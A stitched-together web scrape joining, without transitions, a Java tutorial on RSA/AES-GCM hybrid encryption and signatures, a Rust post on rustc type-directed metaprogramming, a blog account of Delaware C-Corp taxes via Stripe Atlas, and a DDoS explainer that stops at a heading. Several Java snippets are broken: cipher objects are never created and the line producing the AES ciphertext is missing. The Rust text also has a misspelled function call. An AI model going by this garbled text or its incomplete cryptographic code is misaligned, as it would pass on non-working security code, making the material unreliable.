    <span>KeyGenerator</span> <span>keyGenerator</span> <span>=</span> <span>KeyGenerator</span><span>.</span><span>getInstance</span><span>(</span><span>"AES"</span><span>);</span>
    <span>keyGenerator</span><span>.</span><span>init</span><span>(</span><span>256</span><span>);</span> <span>// bits
</span><span></span>    <span>return</span> <span>keyGenerator</span><span>.</span><span>generateKey</span><span>();</span>
<span>}</span>
</code></pre></div><p>Second, we need a method to encrypt data with AES/GCM:</p><div><pre><code data-lang="java"><span>private</span> <span>byte</span><span>[]</span> <span>encryptWithAES</span><span>(</span><span>byte</span><span>[]</span> <span>data</span><span>,</span> <span>SecretKey</span> <span>sessionKey</span><span>)</span> <span>{</span>

  <span>// 128 is the size of the authentication tag in bits. 128 is the maximum.
</span><span></span>  <span>// Nonce is always 96 bit long. We use 0 as nonce here, as we generate a new session key each time. Reusing a nonce
</span><span></span>  <span>// is only fatal when the key is the same.
</span><span></span>  <span>GCMParameterSpec</span> <span>gcmSpec</span> <span>=</span> <span>new</span> <span>GCMParameterSpec</span><span>(</span><span>128</span><span>,</span> <span>new</span> <span>byte</span><span>[</span><span>96</span> <span>/</span> <span>8</span><span>]);</span>

  <span>return</span> <span>cipher</span><span>.</span><span>doFinal</span><span>(</span><span>data</span><span>);</span>
<span>}</span>
</code></pre></div><p>This method will encrypt the given data with the given session key.</p><p>Now we can use these two methods to encrypt some data with a generated session key:</p><div><pre><code data-lang="java"><span>SecretKey</span> <span>sessionKey</span> <span>=</span> <span>generateSessionKey</span><span>();</span>

<span>String</span> <span>data</span> <span>=</span> <span>"Dear Bob, this is my very secret message, only for your eyes."</span><span>;</span>

</code></pre></div><p><code>aesEncrypted</code> now contains the AES encrypted data we want to send to Bob. To decrypt it, Bob needs the session key, and in the next step we will encrypt the session key with the RSA public key from Bob.</p><p>First, create a new method to encrypt data with a RSA public key:</p><div><pre><code data-lang="java"><span>private</span> <span>byte</span><span>[]</span> <span>encryptWithRSA</span><span>(</span><span>byte</span><span>[]</span> <span>data</span><span>,</span> <span>PublicKey</span> <span>recipientPublicKey</span><span>)</span> <span>{</span>

  <span>rsa</span><span>.</span><span>init</span><span>(</span><span>Cipher</span><span>.</span><span>ENCRYPT_MODE</span><span>,</span> <span>recipientPublicKey</span><span>);</span>

  <span>return</span> <span>rsa</span><span>.</span><span>doFinal</span><span>(</span><span>data</span><span>);</span>
<span>}</span>
</code></pre></div><p>We use RSA with OAEP padding (<a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Optimal asymmetric encryption padding</a> - great name!). Don’t let the <code>ECB</code> in the code above scare you, in this case it’s safe.
OAEP will make sure that the same plaintext will not encrypt to the same ciphertext (a property ECB has and which <a href="https://crypto.stackexchange.com/questions/14487/can-someone-explain-the-ecb-penguin">makes it insecure</a>).</p><p>Now we can use this method to encrypt the session key with the recipients public key (in this case Bobs public key):</p><div><pre><code data-lang="java"><span>byte</span><span>[]</span> <span>rsaEncrypted</span> <span>=</span> <span>encryptWithRSA</span><span>(</span><span>sessionKey</span><span>.</span><span>getEncoded</span><span>(),</span> <span>bob</span><span>.</span><span>getPublic</span><span>());</span>
</code></pre></div><p>We can now send <code>aesEncrypted</code> and <code>rsaEncrypted</code> over an insecure wire to Bob. But how does Bob knows that the data is really from Alice? With the code above we have created confidentiality, but not authenticity (and no, use of AES/GCM <a href="https://security.stackexchange.com/questions/169998/what-differs-the-authenticity-provided-by-rsa-signing-and-aes-gcm">hasn’t fixed that</a>).
To do that, we can use another great property of RSA: it can sign data so that the receiver can be sure that the sender really is the sender and not some attacker.</p><p>Let’s create a method for that:</p><div><pre><code data-lang="java"><span>private</span> <span>byte</span><span>[]</span> <span>signWithRSA</span><span>(</span><span>byte</span><span>[]</span> <span>data</span><span>,</span> <span>PrivateKey</span> <span>senderPrivateKey</span><span>)</span> <span>{</span>
  <span>Signature</span> <span>rsa</span> <span>=</span> <span>Signature</span><span>.</span><span>getInstance</span><span>(</span><span>"SHA256withRSA"</span><span>);</span>
  <span>rsa</span><span>.</span><span>initSign</span><span>(</span><span>senderPrivateKey</span><span>);</span>

  <span>rsa</span><span>.</span><span>update</span><span>(</span><span>data</span><span>);</span>
  <span>return</span> <span>rsa</span><span>.</span><span>sign</span><span>();</span>
<span>}</span>
</code></pre></div><p>This method will hash the given data with SHA-256 and then sign this hash with the <em>private key</em> of the sender (in our case Alice). To verify the signature the recipient (Bob) needs the <em>public key</em> of the sender (Alice). That’s the only open problem with this scheme: you’ll need to somehow get Alice’s public key to Bob without letting an attacker swap Alice’s public key with his own.
Unfortunately I can’t give you a great solution for that :(</p><p>But back to signing the message with RSA:</p><div><pre><code data-lang="java"><span>byte</span><span>[]</span> <span>signature</span> <span>=</span> <span>signWithRSA</span><span>(</span><span>rsaEncrypted</span><span>,</span> <span>alice</span><span>.</span><span>getPrivate</span><span>());</span>
</code></pre></div><p>Now we can send <code>aesEncrypted</code>, <code>rsaEncrypted</code> and <code>signature</code> to Bob over an insecure wire. Bob needs the public key of Alice to verify the signature and then his own private key to decrypt the session key. Then he can use the
session key to AES decrypt the data.</p><p>Let’s start with signature verification:</p><div><pre><code data-lang="java"><span>private</span> <span>boolean</span> <span>verifyWithRSA</span><span>(</span><span>byte</span><span>[]</span> <span>data</span><span>,</span> <span>byte</span><span>[]</span> <span>signature</span><span>,</span> <span>PublicKey</span> <span>senderPublicKey</span><span>)</span> <span>{</span>
  <span>Signature</span> <span>rsa</span> <span>=</span> <span>Signature</span><span>.</span><span>getInstance</span><span>(</span><span>"SHA256withRSA"</span><span>);</span>
  <span>rsa</span><span>.</span><span>initVerify</span><span>(</span><span>senderPublicKey</span><span>);</span>

  <span>rsa</span><span>.</span><span>update</span><span>(</span><span>data</span><span>);</span>
  <span>return</span> <span>rsa</span><span>.</span><span>verify</span><span>(</span><span>signature</span><span>);</span>
<span>}</span>
</code></pre></div><p>This method will create the SHA-256 hash of the given data and uses the sender’s public key to verify if it matches the given signature. If everything is good, it returns <code>true</code>, otherwise it returns <code>false</code>. We can now use this
to verify that the message is really from Alice:</p><div><pre><code data-lang="java"><span>if</span> <span>(!</span><span>verifyWithRSA</span><span>(</span><span>rsaEncrypted</span><span>,</span> <span>signature</span><span>,</span> <span>alice</span><span>.</span><span>getPublic</span><span>()))</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>IllegalStateException</span><span>(</span><span>"Unable to verify the authenticity of the message!"</span><span>);</span>
<span>}</span>
</code></pre></div><p>Next, we add a method to decrypt data with RSA:</p><div><pre><code data-lang="java"><span>private</span> <span>byte</span><span>[]</span> <span>decryptWithRSA</span><span>(</span><span>byte</span><span>[]</span> <span>ciphertext</span><span>,</span> <span>PrivateKey</span> <span>recipientSecretKey</span><span>)</span> <span>{</span>

  <span>return</span> <span>rsa</span><span>.</span><span>doFinal</span><span>(</span><span>ciphertext</span><span>);</span>
<span>}</span>
</code></pre></div><p>Now we can use this method to decrypt the ciphertext of <code>rsaEncrypted</code> to Bobs copy of the session key using his private key:</p><div><pre><code data-lang="java"><span>byte</span><span>[]</span> <span>bobsSessionKeyAsBytes</span> <span>=</span> <span>decryptWithRSA</span><span>(</span><span>rsaEncrypted</span><span>,</span> <span>bob</span><span>.</span><span>getPrivate</span><span>());</span>

</code></pre></div><p>This session key can now be used to AES decrypt the ciphertext in <code>aesEncrypted</code>. First, let’s add a method to decrypt AES:</p><div><pre><code data-lang="java"><span>private</span> <span>byte</span><span>[]</span> <span>decryptWithAES</span><span>(</span><span>byte</span><span>[]</span> <span>ciphertext</span><span>,</span> <span>SecretKey</span> <span>sessionKey</span><span>)</span> <span>{</span>

  </p>
  <p>I explore how to use Rust compiler internals to metaprogram Rust using information from the typechecker, e.g. to automatically insert garbage-collection into Rust code, and discuss the benefits and drawbacks of this approach.</p>
  <p><em>All code in this note is available in the <a href="https://github.com/willcrichton/rustc-type-metaprogramming">rustc-type-metaprogramming</a> repository.</em></p>

<h2 id="introduction">Introduction</h2>

<p>Metaprogramming, or code that generates code<sup id="fnref:1"><a href="#fn:1">1</a></sup>, is broadly useful in statically typed languages for providing abstractions that are difficult to capture in the base syntax or type system. For example, Rust uses <a href="https://doc.rust-lang.org/book/first-edition/macros.html">macros</a> for simple pattern-matching-based code substitution (a more powerful and hygienic version of the C preprocessor), e.g. to implement variadic arguments like in <a href="https://doc.rust-lang.org/1.11.0/std/macro.println!.html">println!</a> and early returns like in <a href="https://doc.rust-lang.org/1.11.0/std/macro.try!.html">try!</a>.</p>

<div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>println!</span><span>(</span><span>"{} {} {}"</span><span>,</span> <span>"This has"</span><span>,</span> <span>"many"</span><span>,</span> <span>"arguments"</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>However, pattern-matching-based metaprogramming tools are limited to simple syntactic transformations. Many common use cases require introspecting a syntactic construct and generating code accordingly, most notably <a href="https://github.com/dtolnay/syn#example-of-a-custom-derive">custom derive</a>. In that example, the metaprogram takes a struct and generates code by looking at the struct’s fields, e.g. to automatically generate <a href="https://github.com/serde-rs/serde">serializers</a> or <a href="http://docs.diesel.rs/diesel/deserialize/trait.Queryable.html">SQL queries</a>.</p>

<div><div><pre><code><span>#[derive(Serialize)]</span>
<span>struct</span> <span>Point</span> <span>{</span> <span>x</span><span>:</span> <span>f32</span><span>,</span> <span>y</span><span>:</span> <span>f32</span> <span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>let</span> <span>origin</span><span>:</span> <span>Point</span> <span>=</span> <span>Point</span> <span>{</span> <span>x</span><span>:</span> <span>0</span><span>,</span> <span>y</span><span>:</span> <span>0</span> <span>};</span>
    <span>println!</span><span>(</span><span>"{}"</span><span>,</span> <span>origin</span><span>.to_json</span><span>());</span> <span>// {"x": 0, "y": 0}</span>
<span>}</span>
</code></pre></div></div>

<p>Many of these custom derives are in fact examples of type-directed metaprograms, since they use the type of the struct fields to determine what code to generate.  However, this approach has two limitations:</p>
<ol>
  <li>This only works for structs since Rust requires the programmer to explicitly write down the type of each field. Many types in Rust are not written down, but instead inferred by the compiler.</li>
  <li>The types are only treated syntactically, not semantically. For example, if the programmer does:
    <div><div><pre><code> <span>type</span> <span>MyFloat</span> <span>=</span> <span>f32</span><span>;</span>

 <span>#[derive(Serialize)]</span>
 <span>struct</span> <span>Point</span> <span>{</span> <span>x</span><span>:</span> <span>MyFloat</span><span>,</span> <span>y</span><span>:</span> <span>f32</span> <span>}</span>
</code></pre></div>    </div>
    <p>Then then the deriver has no way to understand that the types <code>MyFloat</code> and <code>f32</code> are the same.</p>
  </li>
</ol>

<p>More broadly, the issue is that <em>most compilers refuse to expose their type systems (or other internals) to the outside world.</em> Even today, compilers are largely treated as black boxes whose input is a text file and whose output is either a working binary or an error message. At most, languages like Rust will expose their syntax through procedural macro systems, never providing APIs for types, lifetimes, or properties/IRs.</p>

<p>However, at the same time, <em>compilers are able to infer more than ever about their programs through static analysis.</em> With that comes a tradeoff—requiring the programmer to write down less information about their program (while still being type/memory-safe) makes the programmer more productive. However, <em>in plain text</em>, this makes it more difficult for others to read the same program, as understanding types and lifetimes often help us understand what a piece of code is doing. This is why IDEs are actually taking the charge in cracking open the compiler black box. The folks at Microsoft created both the <a href="https://langserver.org/">Language Server Protocol</a> for standardizing a common interface for program navigation/editing, and they’ve also been hard at work on <a href="https://github.com/dotnet/roslyn/wiki/Roslyn%20Overview">Roslyn</a>, a new API for opening up the C# compiler.</p>

<p><em>The benefits of extracting knowledge out of the compiler extend well beyond IDEs.</em> As more compiler APIs emerge, statically typed languages can begin to approach dynamically typed languages in their flexibility and extensibility, but without the overhead. It will become easier to use the introspective tools of today (debugging complex data structures, automatic serializer generation) as well as enable the language extensions of tomorrow (<a href="https://www.cs.cmu.edu/~aldrich/papers/ecoop14-tsls.pdf">type-directed macro parsing</a>, <a href="http://terralang.org/">embedded high-performance DSLs</a>). So let’s figure out how much we can already do with our current compilers!</p>

<h2 id="using-the-rustc-api">Using the rustc API</h2>

<p>Of the moderately popular statically typed languages that I know of, Rust has one of the nicest compilers, <code>rustc</code>, in terms of its <a href="https://rust-lang-nursery.github.io/rustc-guide">documentation</a> and ease of integration. Since rustc is written in Rust, it’s easy to call out to Rust compiler functions in Rust code. Subsequently, in the remainder of this note, we will look at how to use the Rust compiler to do type-directed metaprogramming of Rust code.</p>

<p>Before diving into details, a word of caution: the Rust compiler API is not stable at all, and changes frequently. The specific code in this note will likely be somewhat out of date in a few weeks or months. Running the code requires using the nightly builds. If you are a Rust metaprogramming compiler-hacking fanatic like me, then the specifics will help you understand how to actually use the compiler’s API. Otherwise, you can treat this as an example of what type-directed metaprogramming could look like in a brighter future where these APIs are stable. All of the code below is available in my repository <a href="https://github.com/willcrichton/rustc-type-metaprogramming">rustc-type-metaprogramming</a>. Let’s get to it!</p>

<p>On a high level, our first goal is just to call the Rust compiler and extract the types of a few fragments of Rust code. The Rust compiler API can be found in their <a href="https://github.com/rust-lang/rust/tree/8aa27ee30972f16320ae4a8887c8f54616fff819/src">GitHub repo</a> with <a href="https://rust-lang-nursery.github.io/rustc-guide/">high-level documentation</a>. To start, we need to create a new crate and put it on nightly:</p>
<div><div><pre><code>$ cargo new --bin rustc-type-metaprogramming
$ cd rustc-type-metaprogramming
$ rustup override set nightly-2018-03-19
</code></pre></div></div>

<p>Then we fill out the <code>src/main.rs</code> file:</p>

<div><div><pre><code><span>#![feature(rustc_private,</span> <span>quote)]</span>
<span>fn</span> <span>main</span><span>()</span> <span>{}</span>
</code></pre></div></div>

<p>We use Rust’s feature gates to explicitly declare that we intend to use the private API to rustc as well as the quotation API in <a href="https://github.com/rust-lang/rust/tree/8aa27ee30972f16320ae4a8887c8f54616fff819/src/libsyntax"><code>libsyntax</code></a> (more on that later). At this point, we can look to the rustc driver (<a href="https://github.com/rust-lang/rust/tree/8aa27ee30972f16320ae4a8887c8f54616fff819/src/librustc_driver"><code>librustc_driver</code></a>) to see how the Rust compiler calls its own functions from the top-level (i.e. when the user calls <code>rustc</code> on the command line). Specifically, the <a href="https://github.com/rust-lang/rust/blob/8aa27ee30972f16320ae4a8887c8f54616fff819/src/librustc_driver/lib.rs#L445"><code>run_compiler</code></a> and <a href="https://github.com/rust-lang/rust/blob/8aa27ee30972f16320ae4a8887c8f54616fff819/src/librustc_driver/driver.rs#L67"><code>compile_input</code></a> functions show the 10,000 feet view of the compiler stages. A plain English explanation of this is also provided in the <a href="https://rust-lang-nursery.github.io/rustc-guide/high-level-overview.html">documentation</a>.</p>

<p>We need to do a lot of stuff that’s required by the compiler but largely irrelevant for our task (like provide command line options, create code maps for a non-existent source file, set up a bunch of compiler infrastructure). In the code snippets, I omit the uninteresting boilerplate/lifetimes/etc. with <code>...</code>, but you can find the full working example in the repository. Let’s say we want to type-check the function <code>fn main() { let x = 1 + 2; }</code>. Our metaprogramming function then looks like:</p>

<div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>...</span>

    <span>let</span> <span>krate</span> <span>=</span> <span>{</span>
        <span>...</span>
        <span>ast</span><span>::</span><span>Crate</span> <span>{</span>
            <span>...</span>
            <span>quote_item!</span><span>(</span><span>fn</span> <span>main</span><span>()</span> <span>{</span> <span>let</span> <span>x</span> <span>=</span> <span>1</span> <span>+</span> <span>2</span><span>;</span> <span>})</span>
        <span>}</span>
    <span>};</span>

    <span>let</span> <span>hir</span> <span>=</span> <span>driver</span><span>::</span><span>phase_2_configure_and_expand</span><span>(</span><span>krate</span><span>,</span> <span>...</span><span>);</span>
    <span>...</span>

    <span>ty</span><span>::</span><span>TyCtxt</span><span>::</span><span>create_and_enter</span><span>(</span><span>hir</span><span>,</span> <span>...</span><span>,</span> <span>|</span><span>tcx</span><span>|</span> <span>{</span>
        <span>typeck</span><span>::</span><span>check_create</span><span>(</span><span>tcx</span><span>)</span><span>.unwrap</span><span>();</span>
        <span>println!</span><span>(</span><span>"Type checked successfully!"</span><span>);</span>
    <span>});</span>
<span>}</span>
</code></pre></div></div>

<p>This consists of three steps: first, we need to produce a syntactic representation of the program. One way to do this is to represent the program as a string and then run the rustc parser, e.g.</p>

<div><div><pre><code><span>let</span> <span>prog</span><span>:</span> <span>&amp;</span><span>str</span> <span>=</span> <span>"fn main() { let x = 1 + 2; }"</span><span>;</span>
<span>let</span> <span>parser</span> <span>=</span> <span>Parser</span><span>::</span><span>new</span><span>();</span> <span>// not actually this easy IRL</span>
<span>let</span> <span>func</span><span>:</span> <span>ast</span><span>::</span><span>Item</span> <span>=</span> <span>parser</span><span>.parse</span><span>(</span><span>prog</span><span>)</span><span>.unwrap</span><span>();</span>
</code></pre></div></div>

<p>However, a nicer way to do this is to use quotations, or macros that essentially do the parsing for us. Quotations like <code>quote_item!</code> take as input Rust code and return the programmatic representation of that code as a Rust syntax tree (AST), which we use above. We then wrap the function in a crate, since that’s the input the Rust compiler expects.</p>

<p>Second, we convert the AST into the high-level intermediate representation (HIR), described <a href="https://rust-lang-nursery.github.io/rustc-guide/hir.html">here</a>. HIR has fewer syntactic forms that the AST the programmer uses, e.g. <code>for</code> loops are converted into <code>loop</code> loops. Lastly, we run the typechecker by creating a type context <code>tcx</code> and run it with <code>TyCtxt::check_crate</code>. If our code snippet typechecks like it does in our example, then this code will execute and print the success message. You can verify this with:</p>

<div><div><pre><code>$ cargo run
Type checked successfully!
</code></pre></div></div>



<p>Now that we can run the compiler, we next want to extract the types it computes. Let’s say we want to print out the type of every expression in our sample program. One way to do this would be to manually traverse the syntax tree with recursive <code>match</code> statements, but that’s onerous and not easily extensible when the AST changes. Instead, we can use the visitor pattern where we only define behavior for the parts of the syntax tree we care about, and use default implementations for the rest.</p>

<p>Luckily, this is a common pattern in the Rust compiler so they have already implemented much of this machinery for us! Specifically, <code>librustc::hir::intravisit</code> provides a <a href="https://github.com/rust-lang/rust/blob/8aa27ee30972f16320ae4a8887c8f54616fff819/src/librustc/hir/intravisit.rs#L149">Visitor trait</a> that we can implement to walk through a HIR tree.</p>

<div><div><pre><code><span>struct</span> <span>TestVisitor</span> <span>{</span>
    <span>tcx</span><span>:</span> <span>ty</span><span>::</span><span>TyCtxt</span>
<span>}</span>

<span>impl</span> <span>Visitor</span> <span>for</span> <span>TestVisitor</span> <span>{</span>
    <span>...</span>

    <span>fn</span> <span>visit_expr</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>expr</span><span>:</span> <span>&amp;</span><span>hir</span><span>::</span><span>Expr</span><span>)</span> <span>{</span>
        <span>let</span> <span>ty</span> <span>=</span> <span>self</span><span>.tcx</span><span>.type_of</span><span>(</span><span>expr</span><span>);</span> <span>// not actually this easy IRL</span>
        <span>println!</span><span>(</span><span>"Node: {:?}, type: {:?}"</span><span>,</span> <span>expr</span><span>,</span> <span>ty</span><span>);</span>
        <span>intravisit</span><span>::</span><span>walk_expr</span><span>(</span><span>self</span><span>,</span> <span>expr</span><span>);</span>
    <span>}</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>...</span>

    <span>ty</span><span>::</span><span>TyCtxt</span><span>::</span><span>create_and_enter</span><span>(</span><span>hir</span><span>,</span> <span>...</span><span>,</span> <span>|</span><span>tcx</span><span>|</span> <span>{</span>
        <span>typeck</span><span>::</span><span>check_crate</span><span>(</span><span>tcx</span><span>)</span><span>.unwrap</span><span>();</span>
        <span>let</span> <span>mut</span> <span>visitor</span> <span>=</span> <span>TestVisitor</span> <span>{</span> <span>tcx</span><span>:</span> <span>tcx</span> <span>};</span>
        <span>tcx</span><span>.hir</span><span>.visit</span><span>(</span><span>&amp;</span><span>mut</span> <span>visitor</span><span>);</span>
    <span>});</span>
<span>}</span>

</code></pre></div></div>

<p>Running this code, we get the following output:</p>
<div><div><pre><code>$ cargo run
Node: expr(13: { let x = 1 + 2; }), type: ()
Node: expr(11: 1 + 2), type: i32
Node: expr(9: 1), type: i32
Node: expr(10: 2), type: i32
</code></pre></div></div>

<p>Awesome! We were able to access every expression and its type, even though no types were ever written down explicitly. The code works by creating a visitor <code>TestVisitor</code> that contains the type context <code>tcx</code> that tells us the types of expressions when we ask it with <code>type_of</code>. The visitor walks through the HIR tree, and when it finds an expression like <code>1+2</code>, it calls the function which prints both the expression and its type. Then we …</p></div></div>

      <section>
        <p><em>Disclaimer: this blog post doesn’t constitute accounting advice. When in doubt, talk to a lawyer/accountant and all that jazz.</em></p>

<h2 id="background">Background</h2>

<p>I incorporated a C Corp in the State of Delaware via Stripe Atlas in February 2019. It was my first time dealing with the tax system in the US, as I’ve never been or operated a business there.</p>

<p>Taxes must be one of the scariest aspects precluding folks from going into a business. Below is an account of how I <del>struggled</del> dealt with my first tax season.</p>

<p>All usual disclaimers apply.</p>

<h2 id="why-a-c-corp-instead-of-an-llc">Why a C-Corp instead of an LLC?</h2>

<p>A single-member LLC (regarded as a pass-through entity by default) complicates tax situation for nonresident aliens - a term-of-art for non-US citizens &amp; residents (which is me).</p>

<p>While C Corps are more complex to run, their tax treatment is relatively straightforward: they’re only taxed on their profits. If you’re paying yourself a salary, you can expense that amount, which will lower your taxable income (assuming you’re not a US taxpayer. Otherwise, it gets complicated, fast).</p>

<p>If you’re a US citizen or a resident, LLC is more apt if you want to bootstrap your business.</p>

<p>At the time of writing, Stripe has restricted LLCs to US founders only. Presumably, some folks have shot themselves in feet too much that they decided to pull the plug.</p>

<h2 id="registered-agent">Registered agent</h2>

<p>Companies formed in the State of Delaware are required to keep a registered agent in the state. Think of it as an address state and federal agencies use to get ahold of you.</p>

<p>Somewhere around mid-January, you will receive an email from Stripe Atlas asking whether you want to renew the registered agent. If you don’t explicitly opt-out, they will automatically renew your registered agent subscription by the end of January.</p>

<p>Unfortunately, the registered agent that comes with Atlas can’t accept general mail (except for bank cards). Some virtual address providers (aka <abbr title="Commercial mail receiving agency">CMRA</abbr>) can act as your registered agent. That way, you can avoid the $100 fee for the default registered agent that comes with Atlas. To change the registered agent, you will have to complete a “Change of Address” form.</p>

<h2 id="delaware-franchise-tax">Delaware Franchise Tax</h2>

<p>While Delaware doesn’t have a sales tax, they do impose a <em>Franchise Tax</em> on registered businesses.</p>

<p>There are two ways to calculate the Franchise Tax: Authorized Shares Method and Assumed Par Value Capital Method. I won’t get into a <a href="https://corp.delaware.gov/frtaxcalc/">nitty-gritty</a>, but suffice it to say that you can use one that minimizes your tax liability.</p>

<p>A lot of folks running C Corps get stupendously high tax estimates amounting to tens or hundreds of thousands of dollars (causing a drama on the Stripe Atlas forum every time). It happens because the State of Delaware uses an Authorized Shares Method that results in higher tax bills. Once you switch to the Assumed Par Value Capital Method, your tax liability will (probably) drop to $450.</p>

<p>You don’t need an accountant to file an annual report, although the user interface is horrendous, to put it mildly.</p>

<p>One thing that I wish I’d known is that you can save on the Franchise Tax by authorizing 5000 shares (or less) instead of 10,000,000 shares, which is the Atlas’ default. That way, your tax due will be $225 ($175 minimum tax + $50 annual report filing fee) instead of $450. LLCs in Delaware pay a flat $300 tax.</p>

<h2 id="corporate-income-taxes">Corporate income taxes</h2>

<p>You pay corporate income taxes on the profit you make during the tax year. Even if you didn’t earn a single cent from the business, you still have to file a tax report by April 15th (you can ask the <abbr title="Internal Revenue Service">IRS</abbr> to extend the deadline).</p>

<p>Nothing precludes you from filing tax reports yourself. Unless you know what you’re doing, you will probably screw it up (terribly) and waste a lot of time that you otherwise can spend on running your business (tax reporting shouldn’t be <em>that</em> complex, but that’s a topic for another day). Stripe Atlas has partnered with two accounting firms offering tax preparation services at a discount.</p>

<p>Your accountant will ask you some questions and your balance sheet and an income (P&amp;L) statement for the previous financial year, so you will have to take care of the bookkeeping before talking to the accountant.</p>

<p>Because I’m a foreigner owning more than 25% of a US corporation, I have to file Form 5472 as well (in addition to Form 1120). The inaccurate filling or failure to file it usually carries a $25,000 fine. In that light, it’s better to pay an accountant and not worry about it.</p>

<p>Make sure you have an <abbr title="Electronic Federal Tax Payment System">EFTPS</abbr> pin code before the tax season. However, judging by the number of discussions on the Stripe Atlas forum, a lot of folks outside the US don’t receive that mail. To add an insult to the injury, they don’t give you the pin code over the phone. If you’re outside of the US, get yourself a mailing address in the US, and ask the IRS to mail you the EFTPS pin code.</p>

<h2 id="just-give-me-the-numbers">Just give me the numbers</h2>

<table>
  <thead>
    <tr>
      <th>Item</th>
      <th>Cost</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Registered agent</td>
      <td>$100</td>
    </tr>
    <tr>
      <td>Delaware Franchise Tax (C Corp)</td>
      <td>$450</td>
    </tr>
    <tr>
      <td>Accounting service (discounted)</td>
      <td>$250</td>
    </tr>
  </tbody>
</table>

<p>So with the default Stripe Atlas setup for C Corps, you’re looking at $800 for yearly maintenance at a minimum (without corporate income taxes). If you opt to use a default bank account provided by Atlas (SVB), add $300 on top of that ($25 x 12), unless you maintain an average balance of $25,000 per month.</p>

<p>If you plan to incorporate towards the end of the year, wait until January. That way, you can <em>skip</em> one tax year and spend time building a business instead of doing a soul-sucking administrative busywork.</p>

<p>Today, a DDoS attack has become a common phenomenon and a severe headache to internet resource owners worldwide. Therefore, it is important to use a reliable method of protection from this type of cyber-attack for those who want to avoid downtime, massive losses, and damaged reputation.</p>



<p><em>Find out more about </em><a href="https://utopia.fans/security/protected-internet-stay-save-online/"><em>Protected Internet</em></a><em>. Follow simple rules and stay save online.</em></p>



<p>Today, we’ll talk in depth about DDoS attacks and try to answer how to trace a DDoS attack yourself.</p>



<p><a href="https://utopia.fans/privacy/5-reasons-why-online-privacy-matters/"><em>5 Reasons Why Online Privacy Matters</em></a><em>. Stay in touch with all the cyber threats on the net.</em></p>



<h3>The issue of a DDoS attack</h3>



<p><a href="https://www.softwaretestinghelp.com/ddos-attack/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">DDoS or distributed denial of service</a> is a malicious attack on an information system. It is aimed at stopping the system from processing user requests. Such an attack suppresses a web resource or server by using multiple sources to overwhelm the system and make the server unavailable for normal requests. If you think that this type of attack is most often used against large companies and government agencies, you are mistaken. DDoS attacks can occur equally with an ordinary user, as well as with the management of a large company.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Privacy-Matters.jpg.webp" alt="What is a DDoS attack" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Privacy-Matters.jpg.webp 1024w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Privacy-Matters-300x172.jpg.webp 300w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Privacy-Matters-768x441.jpg.webp 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>This type of attack is similar to another Internet threat – Denial of Service (DoS). The main difference is that in the case of DoS the attack comes from a single source, while DDoS attacks are triggered by multiple sources at once, making them much harder to protect against.</p>



<p>The main goal of denial of service attacks is to block the operation of a particular site. In addition, DDoS attacks can serve as a distraction from another, more significant cyber-attack.</p>



<h3>The main reasons for DDoS attacks</h3>



<ul><li><strong>Personal dislike.</strong> Simple animosity often prompts attackers to attack corporations or government agencies. For example, in 1999, the FBI’s websites were attacked for several weeks. It happened because the FBI had begun a large-scale raids on known and suspected hackers.</li></ul>



<ul><li><strong>Political protest.</strong> Usually, such attacks are carried out by hacktivists – IT specialists with radical views on civil protest. A well-known example is a series of cyberattacks on Estonian government institutions in 2007. Their probable cause was the deep controversy at the time over the relocation of the Monument to the Liberators of Tallinn.</li></ul>



<ul><li><strong>Entertainment.</strong> Today, an increasing number of people are interested in DDoS and want to try their hand at it. Novice hackers often stage attacks to amuse themselves.</li></ul>



<ul><li><strong>Extortion and blackmail. </strong>Before launching an attack, the hacker contacts the resource owner and demands a ransom.</li></ul>



<ul><li><strong>Competition.</strong> DDoS attacks can be ordered by an unethical company to negatively impact one or more of its competitors.</li></ul>



<h3>Who are the potential victims?</h3>



<p>DDoS can destroy sites of any scale, from ordinary blogs to major corporations, banks, and other government institutions.</p>



<p>According to research, the attacks can cost the company up to $1.6 million. This is serious damage because the attacked web resource can’t be used for some time.</p>



<p>Most often, these types of sites and servers suffer from DDoS attacks:</p>



<ul><li>large companies and government agencies</li><li>financial institutions (banks, management companies)</li><li>coupon services</li><li>medical institution</li><li>payment systems</li><li>media and information aggregators</li><li>online stores and e-commerce businesses</li><li>online games and gaming services</li><li>cryptocurrency exchanges</li></ul>



<p>Not so long ago, the sad list of frequent victims of DDoS attacks was joined by Internet-connected equipment, commonly called the “Internet of things” (IoT). The IoT is increasingly becoming both a victim and a source of such attacks. The largest growth dynamics in this direction are cyberattacks to disrupt the online sales systems of large stores or shopping centers.</p>



<h3>Work mechanism</h3>



<p>All web servers have their own limits on the number of requests they can process simultaneously. In addition, there is a limit on the bandwidth of the channel connecting the network and the server. To overwhelm these restrictions, malicious hackers create a computer network with malicious software, called a “botnet” or “zombie network.”</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Work-mechanism.png.webp" alt="Example of DDoS attack" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Work-mechanism.png.webp 467w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Work-mechanism-300x191.png.webp 300w" sizes="(max-width: 467px) 100vw, 467px"></figure></div>



<p>To create a botnet, cybercriminals distribute a “Trojan” virus via e-mail, social networks, or websites. Computers that are part of the botnet do not have a physical connection to each other. They are united only by “serving” the goals of the host hacker.</p>



<p>A hacker sends commands to the “infected” zombie computers during a DDoS attack, and they begin to attack. The botnet generates a huge amount of traffic that can overload any system. The main objects for DDoS are usually the server’s bandwidth, DNS server, and the internet connection itself.</p>



<h3>Signs of a DDoS attack</h3>



